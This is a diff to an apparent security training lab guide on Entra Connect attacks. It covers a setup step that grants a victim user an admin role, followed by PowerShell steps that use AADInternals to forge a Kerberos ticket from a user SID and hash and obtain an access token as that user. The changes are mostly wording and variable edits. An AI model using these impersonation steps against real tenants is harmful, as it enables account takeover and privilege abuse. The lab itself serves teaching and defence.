@@ -1,9 +1,9 @@
-# lab 2 - Entra Connect Attacks
+# Lab 2 - Entra Connect Attacks
 ### Prepare a victim user with high privileges
 in Entra portal (login with your admin tenant creds), select ***user1*** and assign it with the **Active** (not *Eligible*) **Application Administrator** role
 
 
-#
+
 # Attacks
 From this point on you act as the adversary, without knowing the Entra / AD Creds, you have code execution as Administrator on the Entra Connect server (in our case- it's the DC VM)
 
@@ -104,14 +104,12 @@ $victimUserSid = "S-1-5-21-CHANGEME" # set the sid of the user you wish to imper
 
 #### 4. Perform the attack
 ```powershell
-$fullyQualifiedDomain = "$domain.onmicrosoft.com" # change to your domain name
-
 # generate kerberos ticket
 $kerberos=New-AADIntKerberosTicket -SidString $victimUserSid -Hash $hash
 
 # get an access token for that user
-$at = Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $fullyQualifiedDomain
-# if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to enable 
+$at = Get-AADIntAccessTokenForAADGraph -KerberosTicket $kerberos -Domain $domain".onmicrosoft.com"
+# if you get AADSTS50079 error, it might mean you have a conditional access policy in your Entra tenant named "Security info registration for Microsoft partners and vendors" that blocks this login, you need to reinstall the entire lab from scratch and associate it yo your new tenant
 
 # start exploring using MS Graph API!
 $MaximumFunctionCount = 8192 # bypass powershell's scope memory limit
